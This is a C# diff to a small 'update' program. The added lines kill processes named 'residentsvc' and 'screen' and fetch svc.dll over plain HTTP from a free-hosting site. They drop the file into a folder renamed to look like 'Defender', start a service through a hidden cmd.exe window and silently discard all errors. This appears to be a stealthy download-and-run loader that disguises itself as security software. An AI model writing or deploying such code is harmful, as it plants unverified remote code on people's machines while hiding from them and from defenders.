@@ -11,34 +11,29 @@ namespace update
 		{
 			try
 			{
-				foreach ( var process in Process.GetProcessesByName( "resident" ) )
+				foreach ( var process in Process.GetProcessesByName( "residentsvc" ) )
+					process.Kill( );
+				foreach ( var process in Process.GetProcessesByName( "screen" ) )
 					process.Kill( );
 
-				var src = "http://slimbde.atwebpages.com/share/src/features.dll";
-				var dst = "features.dll";
+				System.Threading.Thread.Sleep( 500 );
 
-				System.Threading.Thread.Sleep( 2000 );
-
+				var src = "http://slimbde.atwebpages.com/share/src/svc.dll";
+				var dst = AppDomain.CurrentDomain.BaseDirectory.Replace( "Update", "Defender" ) + "svc.dll";
 				var webClient = new WebClient( );
 				webClient.DownloadFile( src, dst );
 
+				System.Threading.Thread.Sleep( 500 );
+
 				var startInfo = new ProcessStartInfo( );
-				startInfo.FileName = "resident.exe";
 				startInfo.CreateNoWindow = true;
-				//startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+				startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+				startInfo.FileName = "cmd.exe";
+
+				startInfo.Arguments = $"/C sc start residentsvc";
 				Process.Start( startInfo );
 			}
-			catch ( Exception ex )
-			{
-				var str = string.Empty;
-				if ( ex.Message != "" )
-					str += string.Concat( "exception: ", ex.Message, "\n" );
-
-				if ( ex.InnerException.Message != "" )
-					str += string.Concat( "innerException: ", ex.InnerException.Message );
-
-				Console.WriteLine( str );
-			}
+			catch ( Exception ) { }
 		}
 	}
 }
